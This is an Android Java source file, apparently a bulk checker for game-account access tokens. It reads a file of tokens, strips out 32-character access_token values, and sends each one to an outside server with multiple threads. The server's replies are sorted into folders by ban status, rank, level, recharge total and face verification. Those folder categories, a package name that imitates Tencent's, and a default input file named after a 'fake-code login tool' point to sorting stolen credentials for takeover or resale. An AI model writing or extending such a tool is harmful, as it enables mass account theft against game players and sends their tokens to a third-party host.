package com.tencent.tim;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.graphics.Color;
import android.widget.*;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;

public class FilterActivity extends Activity {
    
    private EditText filePathInput;
    private RadioGroup platformGroup;
    private Spinner threadSpinner;
    private Button btnSelectFile, btnStart, btnStop;
    private TextView progressText, resultText, fileInfoText;
    private ProgressBar progressBar;
    
    private ExecutorService executorService;
    private volatile boolean isRunning = false;
    private Handler mainHandler;
    private int totalTokens = 0;
    private int processedTokens = 0;
    private int successCount = 0;
    private int errorCount = 0;
    
    // 权限请求码
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    // 文件夹路径
    private String baseDir;
    private String bannedDir;
    private String normalDir;
    private String otherGameDir;
    
    // 段位分类文件夹
    private Map<String, String> rankDirs = new HashMap<String, String>();
    
    // 用于去重的Set
    private Set<String> processedTokensSet = Collections.synchronizedSet(new HashSet<String>());
    
    // 用户名和用户账号常量（根据您的需求修改这些值）
    private static final String USERNAME = "ledi";
    private static final String USER_ACCOUNT = "ledi";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 设置沉浸式状态栏（必须在setContentView之前调用）
        setImmersiveStatusBar();
        
        setContentView(R.layout.filter_activity);
        
        initViews();
        
        // 检查并申请权限
        if (!checkPermissions()) {
            requestPermissions();
        } else {
            initDirectories();
        }
        
        mainHandler = new Handler(Looper.getMainLooper());
    }

    /**
     * 设置沉浸式状态栏 - 增强版
     */
    private void setImmersiveStatusBar() {
        try {
            // 对于所有版本，先尝试清除可能的标志
            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                // Android 5.0+
                Window window = getWindow();
                
                // 清除可能的旧标志
                window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
                
                // 添加新标志
                window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
                
                // 设置状态栏完全透明
                window.setStatusBarColor(Color.TRANSPARENT);
                
                // 设置系统UI可见性
                int systemUiVisibility = window.getDecorView().getSystemUiVisibility();
                systemUiVisibility |= View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
                systemUiVisibility |= View.SYSTEM_UI_FLAG_LAYOUT_STABLE;
                
                // 对于Android 6.0+，设置浅色状态栏（深色文字）
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    systemUiVisibility |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
                }
                
                window.getDecorView().setSystemUiVisibility(systemUiVisibility);
                
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                // Android 4.4
                getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 当窗口焦点变化时重新设置沉浸式状态栏
     */
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            setImmersiveStatusBar();
        }
    }
    
    // 检查权限
    private boolean checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    // 申请权限
    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
        }
    }
    
    // 处理权限申请结果
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int grantResult : grantResults) {
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                // 权限已授予
                initDirectories();
                Toast.makeText(this, "权限已授予", Toast.LENGTH_SHORT).show();
            } else {
                // 权限被拒绝
                Toast.makeText(this, "需要存储权限才能读取文件和保存结果", Toast.LENGTH_LONG).show();
                // 禁用开始按钮
                btnStart.setEnabled(false);
                btnStart.setText("需要存储权限");
            }
        }
    }
    
    private void initViews() {
        filePathInput = (EditText) findViewById(R.id.file_path_input);
        platformGroup = (RadioGroup) findViewById(R.id.platform_group);
        threadSpinner = (Spinner) findViewById(R.id.thread_spinner);
        btnSelectFile = (Button) findViewById(R.id.btn_select_file);
        btnStart = (Button) findViewById(R.id.btn_start_filter);
        btnStop = (Button) findViewById(R.id.btn_stop_filter);
        progressText = (TextView) findViewById(R.id.progress_text);
        resultText = (TextView) findViewById(R.id.result_text);
        fileInfoText = (TextView) findViewById(R.id.file_info_text);
        progressBar = (ProgressBar) findViewById(R.id.progress_bar);
        
        // 设置线程数选择
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, 
            android.R.layout.simple_spinner_item, 
            new String[]{"1", "2", "5", "10", "20"});
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        threadSpinner.setAdapter(adapter);
        threadSpinner.setSelection(2); // 默认选择5线程
        
        // 设置默认文件路径
        filePathInput.setText(Environment.getExternalStorageDirectory() + "/伪码上号器.txt");
        
        btnSelectFile.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectFile();
            }
        });
        
        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 检查权限
                if (!checkPermissions()) {
                    Toast.makeText(FilterActivity.this, "请先授予存储权限", Toast.LENGTH_SHORT).show();
                    requestPermissions();
                    return;
                }
                startFiltering();
            }
        });
        
        btnStop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopFiltering();
            }
        });
    }
    
    private void selectFile() {
        // 检查权限
        if (!checkPermissions()) {
            Toast.makeText(this, "请先授予存储权限", Toast.LENGTH_SHORT).show();
            requestPermissions();
            return;
        }
        
        // 这里可以添加文件选择器逻辑
        // 暂时使用简单的EditText输入
        Toast.makeText(this, "请在输入框中修改文件路径", Toast.LENGTH_SHORT).show();
    }
    
    // 读取文件内容
    private List<String> readTokensFromFile(String filePath) {
        List<String> lines = new ArrayList<String>();
        BufferedReader reader = null;
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Toast.makeText(this, "文件不存在: " + filePath, Toast.LENGTH_LONG).show();
                return lines;
            }
            
            // 检查文件读取权限
            if (!file.canRead()) {
                Toast.makeText(this, "无法读取文件，请检查权限: " + filePath, Toast.LENGTH_LONG).show();
                return lines;
            }
            
            reader = new BufferedReader(new FileReader(file));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty()) {
                    lines.add(line);
                }
            }
            
            // 显示文件信息
            final int lineCount = lines.size();
            mainHandler.post(new Runnable() {
                @Override
                public void run() {
                    fileInfoText.setText("文件包含 " + lineCount + " 行数据");
                }
            });
            
        } catch (IOException e) {
            Toast.makeText(this, "读取文件失败: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return lines;
    }
    
    private void initDirectories() {
        baseDir = Environment.getExternalStorageDirectory() + "/过滤器/";
        bannedDir = baseDir + "封号账号/";
        normalDir = baseDir + "正常账号/";
        otherGameDir = baseDir + "其他游戏账号/";
        
        // 创建基础目录
        createDirectory(baseDir);
        createDirectory(bannedDir);
        createDirectory(normalDir);
        createDirectory(otherGameDir);
        
        // 创建段位分类目录
        String[] ranks = {"青铜", "白银", "黄金", "铂金", "钻石", "皇冠", "王牌"};
        for (String rank : ranks) {
            String dir = normalDir + rank + "/";
            createDirectory(dir);
            rankDirs.put(rank, dir);
        }
        
        // 创建其他分类目录
        createDirectory(normalDir + "退游账号/");
        createDirectory(normalDir + "低等级账号/");
        createDirectory(normalDir + "高等级账号/");
        createDirectory(normalDir + "人脸账号/");
        createDirectory(normalDir + "无人脸账号/");
        
        // 启用开始按钮
        btnStart.setEnabled(true);
        btnStart.setText("开始过滤");
    }
    
    private void createDirectory(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                boolean created = dir.mkdirs();
                if (!created) {
                    Toast.makeText(this, "创建目录失败: " + path, Toast.LENGTH_SHORT).show();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // 截取access_token的方法
    private String extractAccessToken(String tokenLine) {
        if (tokenLine == null || tokenLine.trim().isEmpty()) {
            return null;
        }
        
        String line = tokenLine.trim();
        
        // 如果已经是32位的纯字符，直接返回
        if (line.length() == 32 && line.matches("[A-Fa-f0-9]+")) {
            return line.toUpperCase(); // 统一转为大写
        }
        
        // 从完整token数据中截取access_token
        if (line.contains("access_token=")) {
            int startIndex = line.indexOf("access_token=") + 13;
            int endIndex = line.indexOf("&", startIndex);
            if (endIndex == -1) {
                endIndex = line.length();
            }
            
            String token = line.substring(startIndex, endIndex);
            
            // 验证token格式（32位十六进制）
            if (token.length() == 32 && token.matches("[A-Fa-f0-9]+")) {
                return token.toUpperCase(); // 统一转为大写
            }
        }
        
        return null;
    }
    
    private void startFiltering() {
        String filePath = filePathInput.getText().toString().trim();
        if (filePath.isEmpty()) {
            Toast.makeText(this, "请输入文件路径", Toast.LENGTH_SHORT).show();
            return;
        }
        
        // 再次检查权限
        if (!checkPermissions()) {
            Toast.makeText(this, "请先授予存储权限", Toast.LENGTH_SHORT).show();
            requestPermissions();
            return;
        }
        
        // 读取文件
        List<String> tokenLines = readTokensFromFile(filePath);
        if (tokenLines.isEmpty()) {
            Toast.makeText(this, "文件为空或读取失败", Toast.LENGTH_SHORT).show();
            return;
        }
        
        Set<String> tokenSet = new HashSet<String>(); // 使用Set自动去重
        
        // 提取有效的access_token并去重
        for (String line : tokenLines) {
            String token = extractAccessToken(line);
            if (token != null) {
                tokenSet.add(token); // Set会自动去重
            }
        }
        
        if (tokenSet.isEmpty()) {
            Toast.makeText(this, "未找到有效的access_token", Toast.LENGTH_SHORT).show();
            return;
        }
        
        String[] tokens = tokenSet.toArray(new String[0]);
        totalTokens = tokens.length;
        processedTokens = 0;
        successCount = 0;
        errorCount = 0;
        processedTokensSet.clear(); // 清空处理过的token记录
        
        isRunning = true;
        btnStart.setEnabled(false);
        btnStop.setEnabled(true);
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setMax(totalTokens);
        
        // 获取选择的平台和线程数
        final String platform = (platformGroup.getCheckedRadioButtonId() == R.id.platform_ios) ? "ios" : "android";
        final int threadCount = Integer.parseInt(threadSpinner.getSelectedItem().toString());
        
        executorService = Executors.newFixedThreadPool(threadCount);
        
        // 在UI线程显示提取结果
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                progressText.setText("已提取 " + totalTokens + " 个有效Token（已去重），开始过滤...");
                resultText.setText("");
            }
        });
        
        // 提交任务
        for (String token : tokens) {
            if (!isRunning) break;
            
            final String cleanToken = token.trim();
            if (!cleanToken.isEmpty()) {
                executorService.submit(new Runnable() {
                    @Override
                    public void run() {
                        processToken(cleanToken, platform);
                    }
                });
            }
        }
        
        updateProgress();
    }
    
    private void stopFiltering() {
        isRunning = false;
        if (executorService != null) {
            executorService.shutdownNow();
        }
        btnStart.setEnabled(true);
        btnStop.setEnabled(false);
        progressText.setText("过滤已停止");
    }
    
    private void processToken(String token, String platform) {
        // 检查是否已经处理过这个token（防止重复处理）
        if (processedTokensSet.contains(token)) {
            processedTokens++;
            updateProgress();
            return;
        }
        
        processedTokensSet.add(token);
        
        try {
            // 修改后的HTTP请求，添加用户名和用户账号参数
            String url = "http://ys.a88.pp.ua/%E6%95%B0%E6%8D%AE/gl.php?" +
                        "access_token=" + token + 
                        "&platform=" + platform +
                        "&用户名=" + USERNAME +
                        "&用户账号=" + USER_ACCOUNT;
            
            String response = httpGet(url);
            
            JSONObject json = new JSONObject(response);
            boolean success = json.optBoolean("success", false);
            
            if (success) {
                successCount++;
                processSuccessAccount(token, json, platform);
            } else {
                errorCount++;
                saveToFile(otherGameDir, "其他游戏账号.txt", 
                    "Token: " + token + "\n" +
                    "平台: %s" + platform + "\n" +
                    "错误: " + json.optString("error", "未知错误") + "\n" +
                    "==================================================\n\n");
            }
            
        } catch (Exception e) {
            errorCount++;
            saveToFile(otherGameDir, "错误账号.txt", 
                "Token: " + token + "\n" +
                "平台: " + platform + "\n" +
                "异常: " + e.getMessage() + "\n" +
                "==================================================\n\n");
        } finally {
            processedTokens++;
            updateProgress();
        }
    }
    
    private String httpGet(String urlStr) throws IOException {
        HttpURLConnection conn = null;
        BufferedReader reader = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android; Mobile)");
            conn.setRequestProperty("Accept", "application/json");
            
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                return response.toString();
            } else {
                throw new IOException("HTTP error code: " + responseCode);
            }
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (conn != null) {
                conn.disconnect();
            }
        }
    }
    
    private void processSuccessAccount(String token, JSONObject data, String platform) {
        try {
            // 处理苹果和安卓数据
            Object appleDataObj = data.opt("apple_data");
            Object androidDataObj = data.opt("android_data");
            
            JSONObject accountData = null;
            
            if (platform.equals("android") && androidDataObj instanceof JSONObject) {
                accountData = (JSONObject) androidDataObj;
            } else if (platform.equals("ios") && appleDataObj instanceof JSONObject) {
                accountData = (JSONObject) appleDataObj;
            }
            
            if (accountData == null) {
                // 如果没有特定平台数据，尝试获取第一个可用数据
                if (androidDataObj instanceof JSONObject) {
                    accountData = (JSONObject) androidDataObj;
                } else if (appleDataObj instanceof JSONObject) {
                    accountData = (JSONObject) appleDataObj;
                } else {
                    return; // 没有有效数据
                }
            }
            
            String characName = getStringValue(accountData, "角色名称", "未知");
            String isBanned = getStringValue(accountData, "是否封号", "账号正常");
            String rank = getStringValue(accountData, "段位", "未知");
            String rankScore = getStringValue(accountData, "段位积分", "0");
            String level = getStringValue(accountData, "账号等级", "0");
            String isOnline = getStringValue(accountData, "是否在线", "不在线");
            String heatValue = getStringValue(accountData, "热力值", "0");
            String recharge = getStringValue(accountData, "充值总额", "0");
            String isFaceVerified = getStringValue(accountData, "是否人脸", "未知");
            String completeTokenData = getStringValue(data, "complete_token_data", "无");
            
            // 构建输出信息
            String info = "Token: " + token + "\n" +
                         "平台: " + platform + "\n" +
                         "角色: " + characName + "\n" +
                         "等级: " + level + "\n" +
                         "段位: " + rank + "(" + rankScore + "分)\n" +
                         "热力值: " + heatValue + "\n" +
                         "在线: " + isOnline + "\n" +
                         "充值: " + recharge + "\n" +
                         "封号: " + isBanned + "\n" +
                         "人脸: " + isFaceVerified + "\n" +
                         "查询时间: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + "\n" +
                         "完整数据: " + completeTokenData + "\n" +
                         "==================================================\n\n";
            
            // 分类保存
            if ("已封号".equals(isBanned)) {
                saveToFile(bannedDir, "封号账号.txt", info);
            } else {
                // 正常账号按段位分类
                String rankCategory = rank.split(" ")[0]; // 处理"王牌 1星"这种情况
                if (rankDirs.containsKey(rankCategory)) {
                    saveToFile(rankDirs.get(rankCategory), rankCategory + "账号.txt", info);
                }
                
                // 保存到总览
                saveToFile(normalDir, "正常账号总览.txt", info);
                
                // 按等级分类（40级以上为无后台账号）
                try {
                    int levelNum = Integer.parseInt(level);
                    if (levelNum < 10) {
                        saveToFile(normalDir + "低等级账号/", "低等级账号.txt", info);
                    } else if (levelNum >= 40) { // 40级及以上为无后台账号
                        saveToFile(normalDir + "高等级账号/", "高等级账号.txt", info);
                    }
                } catch (NumberFormatException e) {
                    // 等级格式错误，跳过等级分类
                }
                
                // 按人脸状态分类
                if ("人脸号".equals(isFaceVerified)) {
                    saveToFile(normalDir + "人脸账号/", "人脸账号.txt", info);
                } else if ("无人脸".equals(isFaceVerified)) {
                    saveToFile(normalDir + "无人脸账号/", "无人脸账号.txt", info);
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
            saveToFile(otherGameDir, "处理异常账号.txt", 
                "Token: " + token + "\n" +
                "平台: " + platform + "\n" +
                "异常: " + e.getMessage() + "\n" +
                "==================================================\n\n");
        }
    }
    
    private String getStringValue(JSONObject json, String key, String defaultValue) {
        try {
            return json.getString(key);
        } catch (Exception e) {
            return defaultValue;
        }
    }
    
    private void saveToFile(String directory, String filename, String content) {
        try {
            File file = new File(directory, filename);
            FileWriter writer = new FileWriter(file, true);
            writer.write(content);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private void updateProgress() {
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                progressBar.setProgress(processedTokens);
                progressText.setText(String.format("进度: %d/%d | 成功: %d | 失败: %d", 
                    processedTokens, totalTokens, successCount, errorCount));
                
                if (processedTokens >= totalTokens) {
                    filteringCompleted();
                }
            }
        });
    }
    
    
    private void filteringCompleted() {
        isRunning = false;
        btnStart.setEnabled(true);
        btnStop.setEnabled(false);
        progressText.setText("过滤完成!");
        
        String result = String.format(
            "过滤完成!\n总数: %d\n成功: %d\n失败: %d\n文件保存在: %s",
            totalTokens, successCount, errorCount, baseDir
        );
        resultText.setText(result);
        
        Toast.makeText(this, "过滤完成! 文件保存在: " + baseDir, Toast.LENGTH_LONG).show();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopFiltering();
    }
}